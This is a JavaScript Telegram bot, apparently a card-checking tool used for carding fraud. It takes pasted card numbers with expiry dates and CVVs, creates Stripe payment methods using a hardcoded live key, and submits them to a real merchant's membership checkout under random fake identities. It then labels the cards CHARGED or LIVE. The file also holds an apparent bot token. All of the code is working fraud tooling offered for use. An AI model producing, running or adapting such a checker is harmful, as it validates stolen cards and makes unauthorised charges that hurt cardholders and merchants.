const TELEGRAM_TOKEN = '7286429810:AAHBzO7SFy6AjYv8avTRKWQg53CJpD2KEbM';
const SECRET_PATH = '/webhook-secret-path';

async function handleRequest(request) {
    const url = new URL(request.url);
    
    if (url.pathname === SECRET_PATH && request.method === 'POST') {
        return handleTelegramWebhook(request);
    }
    
    return new Response('Not Found', { status: 404 });
}

async function handleTelegramWebhook(request) {
    const update = await request.json();
    const message = update.message;
    
    if (message && message.text) {
        const chatId = message.chat.id;
        const text = message.text;
        
        if (text.startsWith('/check')) {
            const cc = text.split(' ')[1];
            const result = await checkCard(cc);
            await sendTelegramMessage(chatId, JSON.stringify(result, null, 2));
        }
    }
    
    return new Response('OK');
}

function typ(cc) {
    const firstDigit = cc[0];
    switch(firstDigit) {
        case '3': return 'amex';
        case '4': return 'visa';
        case '5': return 'mastercard';
        case '6': return 'discover';
        default: return 'Unknown';
    }
}

async function checkCard(cc) {
    try {
        const [num, mon, yer, cvv] = cc.split("|").map(s => s.trim());
        const name = generateRandomName();
        const email = generateRandomEmail(name);
        
        // Stripe Payment Method Request
        const stripeResponse = await fetch('https://api.stripe.com/v1/payment_methods', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36'
            },
            body: new URLSearchParams({
                "type": "card",
                "card[number]": num,
                "card[cvc]": cvv,
                "card[exp_month]": mon,
                "card[exp_year]": yer,
                "key": "pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX"
            })
        });
        
        const stripeData = await stripeResponse.json();
        const paymentMethodId = stripeData.id;

        // Membership Checkout Request
        const checkoutResponse = await fetch('https://www.rebelsdiet.com/membership-account/membership-checkout/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.rebelsdiet.com',
                'Referer': 'https://www.rebelsdiet.com/membership-account/membership-checkout/',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36'
            },
            body: new URLSearchParams({
                "level": "3",
                "username": name,
                "password": "johncarles",
                "bemail": email,
                "CardType": typ(num),
                "payment_method_id": paymentMethodId,
                "AccountNumber": `XXXXXXXXXXXX${num.slice(-4)}`,
                "ExpirationMonth": mon,
                "ExpirationYear": yer
            })
        });

        const responseText = await checkoutResponse.text();
        return formatResponse(responseText, cc);
        
    } catch (error) {
        return { Author: "Sahid", Status: "Error" };
    }
}

function formatResponse(responseText, cc) {
    const text = responseText.toLowerCase();
    let msg = "DECLINED";
    
    if (text.includes("succeeded") || text.includes("thank")) {
        msg = "CHARGED";
    } else if (text.includes("security code") || text.includes("cvc") || text.includes("cvv")) {
        msg = "CCN LIVE";
    } else if (text.includes("3ds") || text.includes("otp")) {
        msg = "3D CHALLENGE LIVE";
    }
    
    return {
        Author: "Sahid",
        Status: msg,
        Gateway: "Stripe Charged $49",
        Card: cc
    };
}

// Helper functions
function generateRandomName() {
    const names = ['John', 'Jane', 'Mike', 'Sarah', 'David'];
    return names[Math.floor(Math.random() * names.length)].toUpperCase();
}

function generateRandomEmail(name) {
    const randomString = Math.random().toString(36).substring(2, 10);
    return `${name}${randomString}@gmail.com`;
}

async function sendTelegramMessage(chatId, text) {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: text
        })
    });
}

addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});
